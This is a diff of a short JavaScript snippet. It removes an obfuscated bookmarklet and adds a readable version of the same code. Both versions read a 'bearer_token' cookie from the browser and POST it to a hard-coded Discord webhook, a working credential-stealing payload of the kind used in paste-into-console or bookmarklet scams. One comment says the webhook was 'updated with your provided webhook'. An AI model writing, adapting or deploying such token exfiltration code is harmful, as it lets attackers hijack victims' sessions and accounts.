@@ -1,1 +1,49 @@
-javascript:(function(){function _0x4f6f(){const _0x8e2d=document.cookie.split('; ');for(let _0x62c1=0;_0x62c1<_0x8e2d.length;_0x62c1++){const _0x1b24=_0x8e2d[_0x62c1];if(_0x1b24.startsWith('bearer_token=')){return _0x1b24.split('=')[1]}}return null}const _0x13fa=_0x4f6f();if(_0x13fa){console.log('Bearer Token:',_0x13fa);const _0x4384='https://discord.com/api/webhooks/1313187900338212977/G-FWHz8JSsAUP_0S_Eg0hW34zMBRm2ADsq4Ye-LUV0CxScS-IbYru7oVtBpD_U-U-MuR';const _0x1e28={content:`Bearer Token: ${_0x13fa}`};fetch(_0x4384,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_0x1e28)}).then(_0x3ed9=>{if(_0x3ed9.ok){console.log('Successfully sent to Discord:',_0x3ed9.status)}else{_0x3ed9.text().then(_0x37b6=>{console.error('Failed to send to Discord, Status Code:',_0x3ed9.status);console.error('Response text:',_0x37b6)})}}).catch(_0x2c38=>{console.error('Error sending to Discord:',_0x2c38)})}else{console.log('Bearer token not found.')}})();
+(function() {
+    function getBearerToken() {
+        const cookies = document.cookie.split('; ');
+        for (let i = 0; i < cookies.length; i++) {
+            const cookie = cookies[i];
+            if (cookie.startsWith('bearer_token=')) {
+                return cookie.split('=')[1];
+            }
+        }
+        return null;
+    }
+
+    const bearerToken = getBearerToken();
+    if (bearerToken) {
+        console.log('Bearer Token:', bearerToken);
+
+        // Define the Discord webhook URL (updated with your provided webhook)
+        const webhookUrl = 'https://discord.com/api/webhooks/1313187900338212977/G-FWHz8JSsAUP_0S_Eg0hW34zMBRm2ADsq4Ye-LUV0CxScS-IbYru7oVtBpD_U-U-MuR';
+
+        // Prepare the payload with the bearer token
+        const payload = {
+            content: `Bearer Token: ${bearerToken}`
+        };
+
+        // Send the payload to the Discord webhook using fetch API
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Successfully sent to Discord:', response.status);
+            } else {
+                response.text().then(text => {
+                    console.error('Failed to send to Discord, Status Code:', response.status);
+                    console.error('Response text:', text);
+                });
+            }
+        })
+        .catch(error => {
+            console.error('Error sending to Discord:', error);
+        });
+    } else {
+        console.log('Bearer token not found.');
+    }
+})();
